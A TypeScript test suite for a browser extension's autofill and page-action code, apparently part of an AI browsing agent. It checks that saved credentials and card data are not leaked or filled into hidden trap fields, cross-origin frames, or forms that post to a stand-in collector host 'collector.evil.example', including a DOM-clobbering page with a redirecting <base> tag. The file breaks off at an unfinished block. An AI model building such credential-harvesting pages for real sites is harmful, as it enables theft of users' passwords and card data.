// The extension's page-side code (extension/page.js) against the fixture pages, in Node, on the small DOM next to this
// file: what counts as a field of which kind, what is visible, what a fill may touch, what a snapshot may carry, what
// a click or a key may press. scripts/test-browser-fill.mts runs these first; `npx tsx` on this file runs them alone.
// (A stand-in DOM proves the logic, not the browser: the same pages are served by scripts/serve-fixtures.mjs for Chrome.)
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { enter, loadPage } from "./mini-dom.mjs";
import * as page from "../../../extension/page.js";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const OTHER = "https://collector.evil.example";
type Check = (name: string, ok: boolean, detail?: string) => void;
type El = {
  value: string;
  checked?: boolean;
  localName: string;
  getAttribute(n: string): string | null;
  setAttribute(n: string, v: string): void;
  removeAttribute(n: string): void;
  focus(): void;
  remove(): void;
  addEventListener(t: string, fn: (e: { preventDefault(): void }) => void): void;
  textContent: string;
  scrollTop: number;
  selectedIndex?: number;
};
type Win = ReturnType<typeof loadPage>;

const USER = "ryan.tester@example.com";
const PASS = "Vault-CANARY-pw-91x";
const CARD = { "cc-name": "Ryan Tester", "cc-number": "4242424242424242", "cc-exp-month": "03", "cc-exp-year": "2031", "cc-csc": "737" };
const DETAILS = {
  name: "Ryan Tester",
  "given-name": "Ryan",
  "family-name": "Tester",
  email: USER,
  tel: "+1 555 0100",
  "address-line1": "1 Canary Wharf",
  "address-line2": "Flat 9",
  "address-level2": "Springfield",
  "address-level1": "CA",
  "postal-code": "90001",
  country: "US",
};

function open(file: string, opts: { url?: string; top?: Win | null; html?: string; strip?: RegExp } = {}) {
  let html = opts.html ?? fs.readFileSync(path.join(HERE, file), "utf8");
  html = html.replaceAll("{{OTHER}}", OTHER).replaceAll("{{SELF}}", "https://www.acme.example");
  if (opts.strip) html = html.replace(opts.strip, "");
  const win = loadPage(html, { url: opts.url ?? `https://www.acme.example/${file}`, top: opts.top ?? null });
  const leave = enter(win);
  const doc = win.document;
  // (_ga: this DOM's own attribute reader — a form in these pages may have a control named "getAttribute".)
  const $ = (id: string): El => doc._flat().find((e: { _ga(n: string): string | null }) => e._ga("id") === id) as El;
  const fields = (): El[] => doc._flat().filter((e: El) => /^(input|select|textarea)$/.test(e.localName));
  const events = (id: string, type: string) => doc._events.filter((e: { type: string; target: El }) => e.type === type && e.target === $(id));
  return { win, doc, $, fields, events, leave };
}
const kinds = (r: { kinds?: string[] }) => [...(r.kinds ?? [])].sort().join(",");
const J = (v: unknown) => JSON.stringify(v);

export async function runPageTests(check: Check): Promise<void> {
  // ── the injected function stands alone ──
  {
    const p = open("login.html");
    const rebuilt = new Function(`return (${page.pageMain.toString()});`)() as (cmd: unknown) => { kinds: string[] };
    const a = rebuilt({ op: "probe" });
    const b = page.probeFields();
    check("page: pageMain rebuilt from its own source (as chrome.scripting ships it) works alone", J(a.kinds) === J(b.kinds) && a.kinds.length > 0, J(a.kinds));
    check("page: pageEval is self-contained too", (new Function(`return (${page.pageEval.toString()});`)() as (c: string) => { ok: boolean; result: string })("1+2").result === "3");
    p.leave();
  }

  // ── a plain login ──
  {
    const p = open("login.html");
    const pr = page.probeFields();
    check("login: probe finds the user name and the password (and the newsletter's e-mail box), top document, secure", kinds(pr) === "email,password,username" && pr.top === true && pr.secure === true && pr.origin === "https://www.acme.example", J(pr));
    check("login: probe names the form's own submit control and where the form posts", pr.submitName === "Sign in" && pr.submitRef === 9001 && pr.formAction === "https://www.acme.example" && pr.formLeaves === false, J(pr));
    let r = page.fillFields({ origin: "https://www.acme.example", values: { username: USER, password: PASS } });
    check("login: fill puts both in and says only which kinds", r.ok === true && J(r.filled) === '["username","password"]' && J(r.missing) === "[]" && r.step === "done" && !J(r).includes(PASS) && !J(r).includes(USER), J(r));
    check("login: the values are in the right boxes — and in no other", p.$("email").value === USER && p.$("password").value === PASS && p.$("news").value === "" && p.fields().filter((f) => f.value === USER || f.value === PASS).length === 2);
    const ev = p.events("password", "input")[0] as { event: { bubbles: boolean; composed: boolean } } | undefined;
    check("login: each box got a composed, bubbling input and change", Boolean(ev && ev.event.bubbles && ev.event.composed) && p.events("password", "change").length === 1 && p.events("email", "input").length === 1 && p.events("email", "change").length === 1);

    // What a snapshot may carry once the boxes hold secrets.
    p.win._selection = PASS;
    p.$("password").focus();
    const snap = page.pageSnapshot({ maxChars: 6000 });
    const text = J(snap);
    check("login: a snapshot never carries a field's value", !text.includes(PASS) && !text.includes(USER) && snap.interactive.every((i: Record<string, unknown>) => !("value" in i)), text.slice(0, 200));
    check("login: the password box is not listed at all", snap.interactive.every((i: { type?: string; name: string; tag: string }) => i.type !== "password" && !(i.tag === "input" && /password/i.test(i.name))) && snap.interactive.some((i: { name: string }) => i.name === "Sign in"));
    check("login: a box is named by its label, never by what was typed", snap.interactive.some((i: { name: string; tag: string }) => i.tag === "input" && i.name === "Email address"));
    check("login: text selected inside a box is not reported as the page's selection", snap.selection === "");
    check("login: guarded controls are marked (Subscribe) and plain ones are not (Sign in, Search)", snap.interactive.find((i: { name: string }) => i.name === "Subscribe")?.guarded === "button" && !snap.interactive.find((i: { name: string }) => i.name === "Sign in")?.guarded && !snap.interactive.find((i: { name: string }) => i.name === "Search")?.guarded);

    // Acting.
    const ref = (name: string) => snap.interactive.find((i: { name: string }) => i.name === name)!.ref as number;
    p.win.__trinityBridge.refs.set(777, p.$("password"));
    let a = page.pageAct({ action: "type", ref: 777, text: "hunter2" });
    check("login: typing into the password box is refused", a.ok === false && a.error === "secret field" && p.$("password").value === PASS, J(a));
    a = page.pageAct({ action: "click", ref: 777 });
    check("login: clicking the password box is refused", a.ok === false && a.error === "secret field", J(a));
    a = page.pageAct({ action: "type", ref: ref("Search products"), text: "blue widgets", submit: true });
    check("login: type and submit into the search box goes through (its button isn't guarded)", a.ok === true && a.effect === "submit" && p.doc._submits.length === 1 && p.doc._submits[0].form === p.$("site-search") && (p.fields().find((f) => f.getAttribute("name") === "q") as El).value === "blue widgets", J(a));
    a = page.pageAct({ action: "submitter", ref: ref("Get our newsletter") });
    check("login: submitter says what Enter would press, and that it's guarded", a.form === true && a.name === "Subscribe" && a.guarded === true, J(a));
    const keydowns = () => p.doc._events.filter((e: { type: string }) => e.type === "keydown").length;
    const keysBefore = keydowns();
    a = page.pageAct({ action: "press", ref: ref("Get our newsletter"), key: "Enter" });
    check("login: Enter in a form whose button is guarded is held — nothing submitted, no key sent to the page", a.ok === true && a.held === true && a.name === "Subscribe" && p.doc._submits.length === 1 && keydowns() === keysBefore, J(a));
    a = page.pageAct({ action: "type", ref: ref("Get our newsletter"), text: "x@example.com", submit: true });
    check("login: type-and-submit into that form is held too, and nothing is typed", a.held === true && p.$("news").value === "" && p.doc._submits.length === 1 && keydowns() === keysBefore, J(a));
    a = page.pageAct({ action: "click", ref: ref("Subscribe") });
    check("login: a click on the guarded button is held", a.held === true && a.name === "Subscribe" && a.button === true && p.doc._submits.length === 1, J(a));
    a = page.pageAct({ action: "click", ref: ref("Subscribe"), approved: "Subscribe now" });
    check("login: approval of another name doesn't press it", a.held === true && p.doc._submits.length === 1, J(a));
    a = page.pageAct({ action: "press", ref: ref("Get our newsletter"), key: "Enter", approved: "Subscribe" });
    check("login: Enter with the exact name approved submits", a.ok === true && a.effect === "submit" && p.doc._submits.length === 2 && p.doc._submits[1].form === p.$("newsletter"), J(a));
    a = page.pageAct({ action: "click", ref: ref("Subscribe"), approved: "Subscribe" });
    check("login: a click with the exact name approved goes through — pointer and mouse events, then the click", a.ok === true && !a.held && p.doc._submits.length === 3 && ["pointerdown", "mousedown", "pointerup", "mouseup", "click"].every((t) => p.doc._events.some((e: { type: string }) => e.type === t)), J(a));
    // Keys.
    p.$("email").focus();
    a = page.pageAct({ action: "press", key: "Tab" });
    check("login: Tab really moves the focus on (and a private field isn't named)", a.effect === "focus" && p.doc.activeElement === p.$("password") && a.name === "a private field", J(a));
    a = page.pageAct({ action: "press", key: "Tab", shift: true });
    check("login: Shift+Tab moves it back", a.effect === "focus" && p.doc.activeElement === p.$("email") && a.name === "Email address", J(a));
    p.$("news").focus();
    (p.$("news") as El).value = "abc";
    a = page.pageAct({ action: "press", key: "Backspace" });
    check("login: Backspace really deletes", a.effect === "edit" && p.$("news").value === "ab", J(a));
    a = page.pageAct({ action: "press", key: "ArrowLeft" });
    check("login: an arrow moves the caret", a.effect === "caret", J(a));
    p.$("go").focus();
    a = page.pageAct({ action: "type", text: "hello" });
    check("login: typing with a button in focus and no field named is declined plainly (no \"Illegal invocation\")", a.ok === false && a.error === "no field to type into", J(a));
    a = page.pageAct({ action: "press", key: "F7" });
    check("login: a key nothing takes is reported as doing nothing", a.ok === true && a.effect === "none", J(a));
    a = page.pageAct({ action: "press", key: "Enter" });
    check("login: Enter on the focused Sign in button presses it (not guarded)", a.effect === "click" && p.doc._submits[p.doc._submits.length - 1].form === p.$("login"), J(a));
    p.leave();

    // The checks before anything is typed.
    for (const [label, opts, origin, code] of [
      ["another origin than the one asked for", {}, "https://www.acme.example.evil.test", "origin-mismatch"],
      ["a scheme-only difference", {}, "http://www.acme.example", "origin-mismatch"],
      ["a page that isn't a secure context", { url: "http://www.acme.example/login.html" }, "http://www.acme.example", "insecure"],
    ] as [string, { url?: string }, string, string][]) {
      const q = open("login.html", opts);
      r = page.fillFields({ origin, values: { username: USER, password: PASS } });
      check(`login: fill refuses ${label} (${code}) and types nothing`, r.ok === false && r.code === code && q.fields().every((f) => f.value !== USER && f.value !== PASS), J(r));
      q.leave();
    }
    const parent = loadPage("<p>outer</p>", { url: "https://portal.example/" });
    const framed = open("login.html", { top: parent });
    r = page.fillFields({ origin: "https://www.acme.example", values: { username: USER, password: PASS } });
    check("login: fill refuses to run in a frame, even one on the right origin", r.ok === false && r.code === "origin-mismatch" && framed.fields().every((f) => f.value !== PASS), J(r));
    const fs2 = page.pageSnapshot({});
    check("login: in a frame a snapshot is only the things to press — no text, no secret boxes", fs2.text === "" && fs2.outline.length === 0 && fs2.interactive.length > 0 && fs2.interactive.every((i: { type?: string }) => i.type !== "password"), J(fs2).slice(0, 160));
    framed.leave();
  }

  // ── a sign-in in steps ──
  {
    const p = open("two-step.html");
    let pr = page.probeFields();
    check("two-step: the first page shows a user name box only, and its button is Next", kinds(pr) === "username" && pr.submitName === "Next", J(pr));
    let r = page.fillFields({ origin: "https://www.acme.example", values: { username: USER, password: PASS } });
    check("two-step: the user name goes in, the password has no box yet → step next", r.ok === true && J(r.filled) === '["username"]' && J(r.missing) === '["password"]' && r.step === "next" && p.$("ident").value === USER && p.$("pw").value === "", J(r));
    p.$("step1").setAttribute("hidden", "");
    p.$("step2").removeAttribute("hidden");
    pr = page.probeFields();
    check("two-step: the second page shows the password box, and its button is Sign in", kinds(pr) === "password" && pr.submitName === "Sign in", J(pr));
    r = page.fillFields({ origin: "https://www.acme.example", values: { username: USER, password: PASS } });
    check("two-step: the password goes in → done (the user name's box is gone)", r.ok === true && J(r.filled) === '["password"]' && r.step === "done" && p.$("pw").value === PASS, J(r));
    p.$("step3").removeAttribute("hidden");
    r = page.fillFields({ origin: "https://www.acme.example", values: { password: PASS } });
    check("two-step: a code box waiting with nothing for it → step otp", r.ok === true && r.step === "otp", J(r));
    p.$("step2").setAttribute("hidden", "");
    pr = page.probeFields();
    check("two-step: the third page asks for a one-time code", kinds(pr) === "otp" && pr.submitName === "Verify", J(pr));
    r = page.fillFields({ origin: "https://www.acme.example", values: { otp: "492817" } });
    const digits = p.fields().filter((f) => /^code\d$/.test(f.getAttribute("name") ?? "")).map((f) => f.value).join("");
    check("two-step: a six-digit code is dealt out one digit a box", r.ok === true && J(r.filled) === '["otp"]' && r.step === "done" && digits === "492817", `${J(r)} ${digits}`);
    r = page.fillFields({ origin: "https://www.acme.example", values: { password: PASS } });
    check("two-step: a hidden password box is never filled", r.ok === false && r.code === "no-fields" && p.$("pw").value === PASS, J(r));
    const snap = page.pageSnapshot({});
    check("two-step: code boxes aren't listed in a snapshot either", snap.interactive.every((i: { name: string }) => !/digit/i.test(i.name)) && !J(snap).includes("492817"), J(snap.interactive));
    p.leave();
  }

  // ── a framework-controlled form ──
  {
    const p = open("react-form.html");
    // What the page's script does in a browser (this DOM runs no scripts): wrap the element's own `value`, and treat an
    // input event whose value it already knows as no change.
    const native = Object.getOwnPropertyDescriptor(p.win.HTMLInputElement.prototype, "value")!;
    const state: Record<string, string> = { user: "", pass: "" };
    const tracked = new Map<El, string>();
    let wrapperSets = 0;
    for (const id of ["user", "pass"]) {
      const el = p.$(id);
      tracked.set(el, "");
      Object.defineProperty(el, "value", {
        configurable: true,
        get() {
          return native.get!.call(this);
        },
        set(v: string) {
          wrapperSets++;
          tracked.set(this as El, String(v));
          native.set!.call(this, v);
        },
      });
      el.addEventListener("input", () => {
        const now = native.get!.call(el) as string;
        if (now === tracked.get(el)) return;
        tracked.set(el, now);
        state[id] = now;
      });
    }
    const r = page.fillFields({ origin: "https://www.acme.example", values: { username: USER, password: PASS } });
    check("react: the fill goes through the prototype's setter, not the framework's wrapper", r.ok === true && J(r.filled) === '["username","password"]' && wrapperSets === 0, `${J(r)} wrapper sets: ${wrapperSets}`);
    check("react: …so the framework's own state takes the values", state.user === USER && state.pass === PASS);
    const snap = page.pageSnapshot({});
    check("react: a user name box named only by its label", snap.interactive.some((i: { name: string }) => i.name === "Username") && !J(snap).includes(USER));
    p.leave();
  }

  // ── a checkout with a split expiry ──
  {
    const p = open("checkout.html");
    const pr = page.probeFields();
    check(
      "checkout: probe sees contact, address and card fields — the split expiry by its labels",
      kinds(pr) === "address-level1,address-level2,address-line1,address-line2,cc-csc,cc-exp-month,cc-exp-year,cc-name,cc-number,country,email,name,postal-code,tel" && pr.submitName === "Pay $51.25",
      J(pr),
    );
    const t = page.pageTotal();
    check("checkout: the total is the order total, not the subtotal", t.total === "$51.25", J(t));
    let r = page.fillFields({ origin: "https://www.acme.example", values: CARD });
    check("checkout: a card fills name, number, month, year and code — kinds only come back", r.ok === true && [...r.filled].sort().join(",") === "cc-csc,cc-exp-month,cc-exp-year,cc-name,cc-number" && r.missing.length === 0 && !J(r).includes("4242"), J(r));
    check("checkout: the month dropdown and the two-digit year box take the right shapes", p.$("expm").value === "03" && p.$("expy").value === "31" && p.$("ccnum").value === "4242424242424242" && p.$("cvc").value === "737" && p.$("ccname").value === "Ryan Tester");
    check("checkout: a card fill leaves the contact and address boxes alone", ["fullname", "mail", "phone", "addr1", "city", "zip"].every((id) => p.$(id).value === ""));
    r = page.fillFields({ origin: "https://www.acme.example", values: DETAILS });
    check("checkout: details fill name, e-mail, phone and address, dropdowns included", r.ok === true && p.$("fullname").value === "Ryan Tester" && p.$("mail").value === USER && p.$("phone").value === "+1 555 0100" && p.$("addr1").value === "1 Canary Wharf" && p.$("addr2").value === "Flat 9" && p.$("city").value === "Springfield" && p.$("state").value === "CA" && p.$("zip").value === "90001" && p.$("country").value === "US", `${J(r)} state=${p.$("state").value} country=${p.$("country").value}`);
    const snap = page.pageSnapshot({});
    const text = J(snap);
    check("checkout: a snapshot lists no card box and carries no card data", !text.includes("4242") && !text.includes("737") && snap.interactive.every((i: { name: string }) => !/card number|security code|expiry/i.test(i.name)) && snap.interactive.some((i: { name: string }) => i.name === "Full name"), snap.interactive.map((i: { name: string }) => i.name).join(" | "));
    const pay = snap.interactive.find((i: { name: string }) => i.name === "Pay $51.25")!;
    check("checkout: the Pay button is marked guarded", pay.guarded === "button", J(pay));
    let a = page.pageAct({ action: "click", ref: pay.ref });
    check("checkout: a click on Pay is held", a.held === true && p.doc._submits.length === 0, J(a));
    const nameRef = snap.interactive.find((i: { name: string }) => i.name === "Full name")!.ref;
    a = page.pageAct({ action: "press", ref: nameRef, key: "Enter" });
    check("checkout: Enter in any box of the form is held too (it would press Pay)", a.held === true && a.name === "Pay $51.25" && p.doc._submits.length === 0, J(a));
    a = page.pageAct({ action: "type", ref: nameRef, text: "X", submit: true });
    check("checkout: type-and-submit is held, with nothing typed", a.held === true && p.$("fullname").value === "Ryan Tester" && p.doc._submits.length === 0, J(a));
    a = page.pageAct({ action: "press", ref: nameRef, key: "Enter", approved: "Pay $51.25" });
    check("checkout: with that exact name approved, Enter submits", a.effect === "submit" && p.doc._submits.length === 1, J(a));
    a = page.pageAct({ action: "select", ref: snap.interactive.find((i: { name: string }) => i.name === "State")!.ref, text: "new york" });
    check("checkout: choosing an option by its words", a.ok === true && p.$("state").value === "NY", J(a));
    p.leave();
  }

  // ── a form inside an open shadow root ──
  {
    const p = open("shadow-form.html");
    const pr = page.probeFields();
    check("shadow: probe sees the fields inside the open shadow root", kinds(pr) === "password,username" && pr.submitName === "Log in", J(pr));
    const r = page.fillFields({ origin: "https://www.acme.example", values: { username: USER, password: PASS } });
    check("shadow: fill reaches them", r.ok === true && J(r.filled) === '["username","password"]' && p.$("u").value === USER && p.$("p").value === PASS, J(r));
    const snap = page.pageSnapshot({});
    const btn = snap.interactive.find((i: { name: string }) => i.name === "Log in");
    check("shadow: a snapshot lists what's inside (the user name box, the button) but not the password", Boolean(btn) && snap.interactive.some((i: { name: string }) => i.name === "User name") && !J(snap).includes(PASS), snap.interactive.map((i: { name: string }) => i.name).join(" | "));
    const a = page.pageAct({ action: "click", ref: btn!.ref });
    check("shadow: its ref can be clicked", a.ok === true && p.doc._submits.length === 1 && p.doc._submits[0].form === p.$("inner"), J(a));
    p.leave();
  }

  // ── card fields in another origin's frame ──
  {
    const p = open("iframe-card.html");
    const pr = page.probeFields();
    check("iframe: probe sees the top document's own fields and counts the cross-origin frame", kinds(pr) === "cc-name,email" && pr.frames === 1, J(pr));
    const r = page.fillFields({ origin: "https://www.acme.example", values: CARD });
    check("iframe: the name fills; number, expiry and code are reported missing (they are in the frame)", r.ok === true && J(r.filled) === '["cc-name"]' && [...r.missing].sort().join(",") === "cc-csc,cc-exp-month,cc-exp-year,cc-number" && r.frames === 1, J(r));
    const frame = open("card-frame.html", { url: `${OTHER}/card-frame.html`, top: p.win });
    const fr = page.fillFields({ origin: OTHER, values: CARD });
    check("iframe: inside the frame nothing is ever filled, whatever origin is named", fr.ok === false && fr.code === "origin-mismatch" && frame.fields().every((f) => f.value === ""), J(fr));
    frame.leave();
    p.leave();
  }

  // ── fields kept out of sight ──
  {
    const p = open("hidden-trap.html");
    const pr = page.probeFields();
    check("trap: probe reports only what a person can see (the e-mail box)", kinds(pr) === "email,username", J(pr));
    const everything = { ...DETAILS, ...CARD, password: PASS };
    const r = page.fillFields({ origin: "https://www.acme.example", values: everything });
    const trapped = p.fields().filter((f) => (f.getAttribute("id") ?? "").startsWith("t-") && f.value !== "");
    check("trap: asked to fill everything, only the visible box is filled", r.ok === true && J(r.filled) === '["email"]' && p.$("email").value === USER, J(r));
    check("trap: hidden, transparent, off-screen, squashed, tiny, disabled, read-only and covered fields all stay empty", trapped.length === 0, trapped.map((f) => f.getAttribute("id")).join(","));
    check("trap: what couldn't be placed is reported missing", ["cc-number", "cc-csc", "tel", "name", "address-line1", "postal-code", "password"].every((k) => r.missing.includes(k)), J(r.missing));
    // Take the lid off: the covered boxes become ordinary boxes.
    p.$("lid").remove();
    const r2 = page.fillFields({ origin: "https://www.acme.example", values: { "family-name": "Tester", "given-name": "Ryan" } });
    check("trap: (control) with the cover removed, the same box is filled", r2.ok === true && p.$("t-covered-name").value === "Tester", J(r2));
    p.leave();
  }

  // ── forms that post somewhere else ──
  {
    const p = open("action-elsewhere.html");
    const pr = page.probeFields();
    check("elsewhere: with a form that stays on this site, the probe describes that one — its button is the one pressed after a fill", pr.formLeaves === false && pr.formAction === "https://www.acme.example" && pr.submitName === "Sign in" && pr.submitRef === 9001, J(pr));
    let r = page.fillFields({ origin: "https://www.acme.example", values: { username: USER, password: PASS } });
    check("elsewhere: with a safe form on the page, that one is filled…", r.ok === true && p.$("u4").value === USER && p.$("p4").value === PASS, J(r));
    check("elsewhere: …and the three that send it away stay empty (action, formaction, and the shadowed action)", ["u1", "p1", "u2", "p2", "u3", "p3"].every((id) => p.$(id).value === ""), ["u1", "p1", "u2", "p2", "u3", "p3"].filter((id) => p.$(id).value !== "").join(","));
    p.leave();
    const q = open("action-elsewhere.html", { strip: /<form id="home"[\s\S]*?<\/form>/ });
    const qr = page.probeFields();
    check("elsewhere: with only forms that post elsewhere, the probe says the form leaves this origin", qr.formLeaves === true && qr.formAction === OTHER, J(qr));
    r = page.fillFields({ origin: "https://www.acme.example", values: { username: USER, password: PASS } });
    check("elsewhere: with only such forms, the fill is refused (form-target) and nothing is typed", r.ok === false && r.code === "form-target" && q.fields().every((f) => f.value !== USER && f.value !== PASS), J(r));
    q.leave();
  }

  // ── a page that names its elements after the DOM's own properties ──
  {
    const p = open("", {
      html: `<!doctype html><html><head><title>Clobber</title></head><body>
        <img name="body" src="x.png" width="10" height="10" /><img name="activeElement" src="x.png" width="10" height="10" /><img name="documentElement" src="x.png" width="10" height="10" />
        <form name="baseURI" id="noise"></form><form name="title"></form><iframe name="scrollingElement" width="10" height="10"></iframe>
        <base href="${OTHER}/" />
        <form id="f" action="post-here"><input id="u" name="querySelectorAll" autocomplete="username" /><input id="pw" type="password" name="elements" /><button id="b" name="requestSubmit">Go</button></form>
        </body></html>`,
      url: "https://www.acme.example/clobber.html",
    });
    const pr = page.probeFields();
    check("clobber: shadowed document and form properties don't blind the probe", kinds(pr) === "password,username", J(pr));
    check("clobber: a <base> that sends relative actions elsewhere is seen for what it is", pr.formLeaves === true && pr.formAction === OTHER, J(pr));
    const r = page.fillFields({ origin: "https://www.acme.example", values: { username: USER, password: PASS } });
    check("clobber: …and the fill refuses that form", r.ok === false && r.code === "form-target" && p.$("u").value === "" && p.$("pw").value === "", J(r));
    const snap = page.pageSnapshot({});
    check("clobber: a snapshot still reads the real page", snap.title === "Clobber" && snap.interactive.some((i: { name: string }) => i.name === "Go"), J(snap).slice(0, 200));
    p.leave();
  }

  // ── totals ──
  {
    const cases: [string, string | null][] = [
      ["<table><tr><td>Subtotal</td><td>$40.00</td></tr><tr><td>Total</td><td>$51.25</td></tr></table>", "$51.25"],
      ["<p>Subtotal $40.00 Total $51.25</p>", "$51.25"],
      ["<div><span>Total:</span> <b>1.234,56 €</b></div>", "1.234,56 €"],
      ["<div>Amount due</div><div>USD 20.00</div>", "USD 20.00"],
      ["<p>Sub total £9.00</p>", null],
      ["<p>Nothing to pay here.</p>", null],
      ['<div style="display:none">Order total $999.00</div><p>Total today: £12.50</p>', "£12.50"],
    ];
    for (const [html, want] of cases) {
      const p = open("", { html, url: "https://www.acme.example/t.html" });
      const t = page.pageTotal();
      check(`total: ${html.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim().slice(0, 44)} → ${want}`, t.total === want, J(t));
      p.leave();
    }
  }

  // ── reading and acting, beyond forms ──
  {
    const links = Array.from({ length: 200 }, (_v, i) => `<p><a href="/item/${i}">Item ${i}</a></p>`).join("");
    const p = open("", {
      html: `<!doctype html><html><head><title>Long</title></head><body><main>
        <input id="plain" value="typed-earlier-SECRETISH" />
        <div id="ed" contenteditable="true" aria-label="Message">draft words typed by the user</div>
        <a id="nt" href="https://other.example/page" target="_blank">Open the report</a>
        <label><input id="cb" type="checkbox" /> Remember</label>
        <select id="sel" aria-label="Size"><option>Small</option><option>Medium</option><option>Large</option></select>
        <textarea id="ta" aria-label="Notes"></textarea>
        <dialog id="dlg" open data-modal><p>Cookie notice</p></dialog>
        <div id="scroller" style="height: 100px; overflow-y: auto;"><div style="height: 1000px;"><a href="/in">Inside the box</a></div></div>
        ${links}</main></body></html>`,
      url: "https://www.acme.example/long.html",
    });
    let snap = page.pageSnapshot({});
    const unnamed = snap.interactive.find((i: { tag: string; name: string }) => i.tag === "input" && i.name === "");
    check("read: an unlabeled box is listed with no name — never with what it holds", Boolean(unnamed) && !J(snap.interactive).includes("typed-earlier"), J(snap.interactive.slice(0, 3)));
    check("read: an editable area is named by its label, not by what was typed in it", snap.interactive.some((i: { name: string; tag: string }) => i.tag === "contenteditable" && i.name === "Message") && !J(snap.interactive).includes("draft words"));
    check("read: 150 things at most, the rest counted", snap.interactive.length === 150 && snap.more > 50, `${snap.interactive.length} listed, ${snap.more} more`);
    check("read: what's on screen comes first", snap.interactive.slice(0, 8).some((i: { name: string }) => i.name === "Open the report") && snap.interactive.every((i: { name: string }) => i.name !== "Item 199"));
    p.doc._root().scrollTo({ top: 100_000 });
    snap = page.pageSnapshot({});
    const at = (name: string) => snap.interactive.findIndex((i: { name: string }) => i.name === name);
    check("read: scrolled to the end, the list starts with what is on screen there", /^Item 1\d\d$/.test(snap.interactive[0].name) && at("Item 199") >= 0 && at("Item 199") < at("Open the report") && snap.scroll.y > 0, snap.interactive.slice(0, 4).map((i: { name: string }) => i.name).join(" | "));
    p.doc._root().scrollTo({ top: 0 });
    snap = page.pageSnapshot({});
    const ref = (name: string) => snap.interactive.find((i: { name: string }) => i.name === name)!.ref as number;
    let a = page.pageAct({ action: "click", ref: ref("Open the report") });
    check("act: a link that wants a new tab is handed to the extension to open, not clicked", a.ok === true && a.open === "https://other.example/page" && p.doc._navigations.length === 0, J(a));
    a = page.pageAct({ action: "scroll", direction: "down" });
    const y1 = p.win.scrollY;
    check("act: scrolling says that it moved", a.ok === true && a.moved === true && y1 > 0, J(a));
    a = page.pageAct({ action: "scroll", direction: "bottom" });
    a = page.pageAct({ action: "scroll", direction: "down" });
    check("act: at the end, scrolling says nothing moved", a.ok === true && a.moved === false, J(a));
    p.doc._root().scrollTo({ top: 0 });
    p.win.__trinityBridge.refs.set(600, p.$("scroller"));
    p.$("scroller").focus();
    p.doc._active = p.$("scroller");
    a = page.pageAct({ action: "scroll", direction: "down", amount: 50 });
    check("act: with a box that scrolls on its own in focus, that box scrolls — not the page", a.moved === true && p.$("scroller").scrollTop === 50 && p.win.scrollY === 0, `${J(a)} box=${p.$("scroller").scrollTop} page=${p.win.scrollY}`);
    p.$("cb").focus();
    a = page.pageAct({ action: "press", key: " " });
    check("act: Space on a checkbox ticks it", a.effect === "click" && p.$("cb").checked === true, J(a));
    p.$("sel").focus();
    a = page.pageAct({ action: "press", key: "ArrowDown" });
    check("act: an arrow on a dropdown changes the choice", a.effect === "select" && p.$("sel").value === "Medium", J(a));
    p.$("ta").focus();
    a = page.pageAct({ action: "type", text: "line one" });
    a = page.pageAct({ action: "press", key: "Enter" });
    check("act: Enter in a text area is a new line", a.effect === "newline" && p.$("ta").value === "line one\n", J(a));
    a = page.pageAct({ action: "press", key: "Escape" });
    check("act: Escape closes an open modal dialog", a.effect === "dialog" && p.$("dlg").getAttribute("open") === null, J(a));
    a = page.pageAct({ action: "press", key: "Escape" });
    check("act: Escape with nothing to close is reported as doing nothing", a.effect === "none", J(a));
    p.$("ed").focus();
    a = page.pageAct({ action: "type", text: "hello there" });
    check("act: typing into an editable area", a.ok === true && p.$("ed").textContent === "hello there", `${J(a)} → ${p.$("ed").textContent}`);
    a = page.pageAct({ action: "click", ref: 4242 });
    check("act: a ref from an old snapshot is refused, not guessed", a.ok === false && a.error === "no such element", J(a));
    p.leave();
  }

  // ── the guard words: one list, kept in two places (the extension holds a press; the engine decides) ──
  {
    const words = (await import("../../../server/src/services/browser-words.ts")) as { GUARD: RegExp };
    const p = open("", { html: "<p>x</p>", url: "https://www.acme.example/guard.html" });
    const names = [
      ...["Buy now", "Buys", "Buying guide", "Purchase", "Purchasing", "Pay", "Pay $5", "Payment", "Payments", "Paypal", "Order", "Reorder", "Orders", "Ordered", "Border", "Checkout", "Check out", "Check"],
      ...["Book", "Booking", "Books", "Facebook", "Bookmark", "Reserve", "Reservation", "Reserved", "Subscribe", "Subscribed", "Unsubscribe", "Donate", "Donation", "Bid", "Bidding", "Forbid", "Transfer", "Transferred"],
      ...["Send", "Sending", "Sender", "Post", "Posted", "Postcard", "Publish", "Published", "Delete", "Deleting", "Remove", "Removed", "Confirm", "Confirmed", "Authorize", "Authorise", "Authorized", "Allow", "Allowed", "Shallow"],
      ...["Grant", "Granted", "Accept", "Accepted", "Agree", "Agreed", "Approve", "Approved", "Submit", "Submitted", "Sign out", "Log out", "Logout", "Apply", "Proceed", "Complete", "Completed"],
      ...["Sign in", "Next", "Continue", "Search", "Cancel", "Save", "Close", "Open", "Read more", "", "PAY NOW", "place your ORDER"],
    ];
    const differ = names.filter((n) => page.pageMain({ op: "guard", name: n }).guarded !== words.GUARD.test(n));
    check("guard: the extension and the engine hold the same words", differ.length === 0 && names.filter((n) => words.GUARD.test(n)).length > 40, `differ: ${differ.join(", ")}`);
    p.leave();
  }

  // ── a fill says whether it typed anything (a tab that was typed into is kept under the fill rules, even if the fill failed) ──
  {
    type Typed = { ok: boolean; code?: string; typed?: boolean };
    const p = open("login.html");
    let r = page.fillFields({ origin: "https://elsewhere.example", values: { username: USER, password: PASS } }) as Typed;
    check("typed: a fill refused before it starts says it typed nothing", r.ok === false && r.code === "origin-mismatch" && r.typed === false, J(r));
    p.leave();
    const q = open("action-elsewhere.html", { strip: /<form id="home"[\s\S]*?<\/form>/ });
    r = page.fillFields({ origin: "https://www.acme.example", values: { username: USER, password: PASS } }) as Typed;
    check("typed: …and so does one stopped by where the form posts", r.ok === false && r.code === "form-target" && r.typed === false, J(r));
    q.leave();
    const e = open("login.html");
    for (const id of ["email", "password"]) e.$(id).addEventListener("input", () => void (e.$(id).value = ""));
    r = page.fillFields({ origin: "https://www.acme.example", values: { username: USER, password: PASS } }) as Typed;
    check("typed: boxes that empty themselves leave nothing filled — and the fill owns up to having typed", r.ok === false && r.code === "no-fields" && r.typed === true && e.$("password").value === "" && e.$("email").value === "", J(r));
    e.leave();
  }

  // ── markup Trinity adds to a page: nothing in it may run, load a frame, take input or carry data away ──
  {
